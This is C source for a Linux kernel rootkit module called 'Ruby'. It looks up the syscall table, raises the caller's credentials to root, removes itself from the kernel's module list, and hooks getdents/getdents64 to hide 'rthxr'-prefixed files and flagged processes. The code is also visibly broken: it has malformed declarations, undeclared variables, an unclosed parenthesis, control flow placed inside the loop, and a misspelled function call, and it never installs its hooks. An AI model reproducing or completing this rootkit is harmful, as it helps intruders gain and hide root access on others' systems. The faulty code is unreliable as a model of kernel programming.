//---------------------------------------------------+
#include<linux/kernel.h>//                           |
#include<linux/module.h>//         libraries         |
#include "library/ftrace_helper.h"//                 |
#include "library/Ruby.h"//                          |
//---------------------------------------------------+
#define RTHXR "rthxr"//         MACROS               |
//---------------------------------------------------+
//                                                                 Global Data
//--------------------------------------------------------------------------------------+
unsigned long *__sysc_table;//                                                          |
typedef asmlinkage (*t_syscall)(const struct pt_regs *);//                              |
//                                                                                      |
static t_syscall orig_getdents;//                                                       |
static t_syscall orig_getdents64;//                                                     |
static t_syscall orig_kill;//                                                           |
//--------------------------------------------------------------------------------------+

//                                                    Returning syscall table address  
//--------------------------------------------------------------------------------------+
unsigned long *__ret_syscall_table(void)//                                              |
{//                                                                                     |
    unsigned long *__sys_call_t;//                                                      |
    __sys_call_t = (unsigned long *)kallsyms_lookup_name("sys_call_table");//           |
//                                                                                      |
    return __sys_call_t;//                                                              |
}//-------------------------------------------------------------------------------------+

//                                                             Structing task list
//--------------------------------------------------------------------------------------+
struct task_struct *find_task(pid_t pid)//                                              |
{//                                                                                     |
    struct task_struct *p = current;//                                                  |
    for_each_process(p)//                                                               |
    {//                                                                                 |
        if(p->pid == pid)//                                                             |
        return p;//                                                                     |
    }//                                                                                 |
//                                                                                      |
    return NULL;//                                                                      |
}//-------------------------------------------------------------------------------------+

//                                     Checking if is invisible
//----------------------------------------------------------------+
int is_invisible(pid_t pid)//                                     |
{//                                                               |
    struct task_struct *task;//                                   |
    if(!pid)//                                                    |
        return 0;//                                               |
    task = find_task(pid);//                                      |
    if(!task)//                                                   |
        return 0;//                                               |
    if(task->flags & PF_INVISIBLE)//                              |
        return 1;//                                               |
//                                                                |
    return 0;//                                                   |
}//---------------------------------------------------------------+

//                              Privilege Escalation Function
//------------------------------------------------------------+
void rubyRoot(void)//                                         |
{//                                                           |
    struct cred *rubyCreds;//                                 |
    rubyCreds = prepare_creds();//                            |
    if(rubyCreds == NULL)//                                   |
        return;//                                             |
//                                                            |
    rubyCreds->uid = rubyCreds->gid = 0;//                    |
    rubyCreds->euid = rubyCreds->egid = 0;//                  |
    rubyCreds->suid = rubyCreds->sgid = 0;//                  |
    rubyCreds->fsuid = rubyCreds->fsgid = 0;//                |
//                                                            |
    commit_creds(rubyCreds);//                                |
//                                                            |
}//-----------------------------------------------------------+

//                                      Hidding Ruby (Rootkit)
//--------------------------------------------------------------+
static inline void tidy(void)//                                 |
{//                                                             |
    kfree(THIS_MODULE->sect_attrs);//                           |
    THIS_MODULE->sect_attrs = NULL;//                           |
}//                                                             |
//                                                              |
static struct list_head *rubyPrevious;//                        |
static short rubyHidden;//                                      |
//                                                              |
void module rubyActive(void)//                                  |
{//                                                             |
    list_add(&THIS_MODULE->list, rubyPrevious);//               |
    rubyHidden = 0;//                                           |
}//                                                             |
//                                                              |
void rubyInactive(void)//                                       |
{//                                                             |
    rubyPrevious = THIS_MODULE->list.prev;//                    |
    list_del(&THIS_MODULE->list);//                             |
//                                                              |
    rubyHidden = 1;//                                           |
}//                                                             |
//--------------------------------------------------------------+

//                                                                            GETDENTS64 CORRUPTION
//------------------------------------------------------------------------------------------------------------+
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);//                                          |
asmlinkage int rthxr_getdents64(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count)//    |
{//                                                                                                           |
    int fd = (int)pt_regs->di;//                                                                              |
    struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;//                                       |
//                                                                                                            |
    int ret = orig_getdents64(pt_regs), err;//                                                                |
//                                                                                                            |
    unsigned short proc = 0;//                                                                                |
    unsigned long off = 0;//                                                                                  |
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;//                                                     |
    struct inode *d_inode;//                                                                                  |
//                                                                                                            |
    if (ret <= 0)//                                                                                           |
        return ret;//                                                                                         |
//                                                                                                            |        
    kdirent = kzalloc(ret, GFP_KERNEL);//                                                                     |
    if(kdirent == NULL)//                                                                                     |
        return ret;//                                                                                         |
//                                                                                                            |
    err = copy_from_user(kdirent, dirent, ret);//                                                             |
    if (err)//                                                                                                |
        goto out;//                                                                                           |
//                                                                                                            |
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;//                                          |
//                                                                                                            |
    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)//                                          |
        proc = 1;//                                                                                           |
//                                                                                                            |
    while (off < ret)//                                                                                       |
    {//                                                                                                       |
        dir = (void *)kdirent + off;//                                                                        |
        if((!proc && (memcmp(RTHXR, dir->d_name, strlen(RTHXR)) == 0)) || (proc && //                         |
        is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {//                                             |
            if(dir == kdirent)//                                                                              |
            {//                                                                                               |
                ret -= dir->d_reclen;//                                                                       |
                memmove(dir, (void *)dir + dir->d_reclen, ret);//                                             |
                continue;//                                                                                   |
            }//                                                                                               |
            prev->d_reclen += dir->d_reclen;//                                                                |
        } else {//                                                                                            |
            prev = dir;//                                                                                     |
            off += dir->d_reclen;//                                                                           |
        }//                                                                                                   |
        err = copy_to_user(dirent, kdirent, ret);//                                                           |
        if (err)//                                                                                            |
            goto out;//                                                                                       |
//                                                                                                            |
        out://                                                                                                |
            kfree(kdirent);//                                                                                 |
            return ret;//                                                                                     |
    }//                                                                                                       |
//                                                                                                            |
}//                                                                                                           |
//------------------------------------------------------------------------------------------------------------+


//                                                                              GETDENTS CORRUPTION
//-------------------------------------------------------------------------------------------------------------+
static asmlinkage long (*orig_hacked_getdents)(const struct pt_regs *);//                                      |
asmlinkage int rthxr_hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count)//|
{//                                                                                                            |
    int fd = (int)pt_regs->di;//                                                                               |
    struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;//                                        |
//                                                                                                             |
    int ret = orig_getdents(pt_regs), err;//                                                                   |
//                                                                                                             |
    unsigned short proc = 0;//                                                                                 |
    unsigned long off = 0;//                                                                                   |
    struct linux_dirent *dir, *kdirent, *prev = NULL;//                                                        |
    struct inode *d_inode;//                                                                                   |
//                                                                                                             |
    if (ret <= 0)//                                                                                            |
        return ret;//                                                                                          |
//                                                                                                             |        
    kdirent = kzalloc(ret, GFP_KERNEL);//                                                                      |
    if(kdirent == NULL)//                                                                                      |
        return ret;//                                                                                          |
//                                                                                                             |
    err = copy_from_user(kdirent, dirent, ret);//                                                              |
    if (err)//                                                                                                 |
        goto out;//                                                                                            | 
//                                                                                                             |
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;//                                           |
//                                                                                                             |
    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)//                                           |
        proc = 1;//                                                                                            |
//                                                                                                             |
    while (off < ret)//                                                                                        |
    {//                                                                                                        |
        dir = (void *)kdirent + off;//                                                                         |
        if((!proc && (memcmp(RTHXR, dir->d_name, strlen(RTHXR)) == 0)) || (proc && //                          |
        is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {//                                              |
            if(dir == kdirent)//                                                                               |
            {//                                                                                                |
                ret -= dir->d_reclen;//                                                                        |
                memmove(dir, (void *)dir + dir->d_reclen, ret);//                                              |
                continue;//                                                                                    | 
            }//                                                                                                |
            prev->d_reclen += dir->d_reclen;//                                                                 |
        } else {//                                                                                             |
            prev = dir;//                                                                                      |
            off += dir->d_reclen;//                                                                            |
        }//                                                                                                    |
        err = copy_to_user(dirent, kdirent, ret);//                                                            |
        if (err)//                                                                                             |
            goto out;//                                                                                        |
//                                                                                                             |
        out://                                                                                                 |
            kfree(kdirent);//                                                                                  |
            return ret;//                                                                                      |
    }//                                                                                                        |
//                                                                                                             |
}//------------------------------------------------------------------------------------------------------------+


static int __init ruby_init(void)
{
    __sysc_table = __ret_syscalL_table();
    return 0;
}

static void __exit ruby_exit(void)
{
    return NULL;
}

MODULE_INIT(ruby_init);
MODULE_EXIT(ruby_exit);
